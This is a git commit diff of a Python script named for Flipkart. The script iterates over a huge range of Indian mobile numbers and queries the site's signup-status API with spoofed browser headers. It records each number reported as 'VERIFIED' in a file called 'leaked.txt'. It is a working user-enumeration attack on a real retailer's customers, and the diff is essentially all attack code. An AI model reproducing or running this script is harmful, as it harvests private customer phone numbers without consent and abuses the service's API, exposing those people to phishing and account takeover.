efb6b6368c69698b36aac8bd283f42776199e8ba
Sarthak Misraa <40424574+sarthakmisraa@users.noreply.github.com>
2019-11-17 16:11:22 +0530

    Update iteration.py

--- flipkart/iteration.py
+++ flipkart/iteration.py
@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 import requests
-from random import randint
 import json
 
 
 b = []
 f = open('leaked.txt','wt')
-for i in range(9811117573,9999999999):
+for i in range(9123456789,9999999999):
     b = []
     for j in range(10):
         ph = "+91" + str(i)
@@ -14,7 +13,6 @@ for i in range(9811117573,9999999999):
         data = {"loginId":b , "supportAllStates":"true"}
     data = json.dumps(data,separators=(',',':'))
     url = 'https://www.flipkart.com/api/6/user/signup/status'
-    proxy = {'http':'http://127.0.0.1:8080/'}
     headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0',
             'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 FKUA/website/41/website/Desktop',
             'Content-Type': 'application/json',
@@ -26,7 +24,3 @@ for i in range(9811117573,9999999999):
         if b[i] == "VERIFIED":
             f.write("{} found in database".format(i))
             print ("{} found in database".format(i))
-'''
-data = {enrol:str(c+1)}
- 50     print (str(json.dumps(data)))
- '''
